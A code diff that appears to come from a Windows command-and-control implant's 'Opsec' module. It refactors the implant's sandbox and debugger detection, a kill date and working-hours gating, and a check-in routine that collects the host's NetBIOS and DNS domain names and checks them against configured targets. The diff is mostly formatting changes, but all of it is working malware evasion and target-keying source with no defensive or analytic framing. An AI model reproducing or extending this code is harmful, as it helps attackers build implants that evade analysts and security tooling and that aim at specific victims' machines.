@@ -5,15 +5,9 @@ namespace Opsec {
 
         bool success = true;
 #ifndef DEBUG
-        if (Opsec::CheckDebugger()) {
-            Utils::Time::Timeout(MINUTES(1));
-            success_(false);
-        }
+        if (Opsec::CheckDebugger()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
 #endif
-        if (Opsec::CheckSandbox()) {
-            Utils::Time::Timeout(MINUTES(1));
-            success_(false);
-        }
+        if (Opsec::CheckSandbox()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
 
         defer:
         return success;
@@ -21,19 +15,20 @@ namespace Opsec {
 
     BOOL CheckTime() {
 
+        bool success = true;
+
         if (Ctx->config.killdate != 0) {
             if (Utils::Time::GetTimeNow() >= Ctx->config.killdate) {
                 Commands::Shutdown(nullptr);
             }
         }
 
-        if (Ctx->config.hours != 0) {
-            if (!Utils::Time::InWorkingHours()) {
-                return false;
-            }
+        if (Ctx->config.hours) {
+            x_assertb(Utils::Time::InWorkingHours());
         }
 
-        return true;
+        defer:
+        return success;
     }
 
     BOOL CheckDebugger() {
@@ -82,12 +77,11 @@ namespace Opsec {
         _stream         *out    = Stream::CreateStreamWithHeaders(TypeCheckin);
         IP_ADAPTER_INFO adapter = { };
 
-        char            buffer[MAX_PATH]    = { };
         unsigned long   length              = MAX_PATH;
+        char            buffer[MAX_PATH]    = { };
         bool            success             = true;
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, R_CAST(LPSTR, buffer), &length)) {
-
             x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
             Stream::PackString(out, buffer);
         }
@@ -98,9 +92,8 @@ namespace Opsec {
         x_memset(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
-        if (Ctx->transport.domain[0] != NULTERM) {
+        if (Ctx->transport.domain[0]) {
             if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, R_CAST(LPSTR, buffer), &length)) {
-
                 x_assertb(x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) == 0);
                 Stream::PackString(out, buffer);
             }
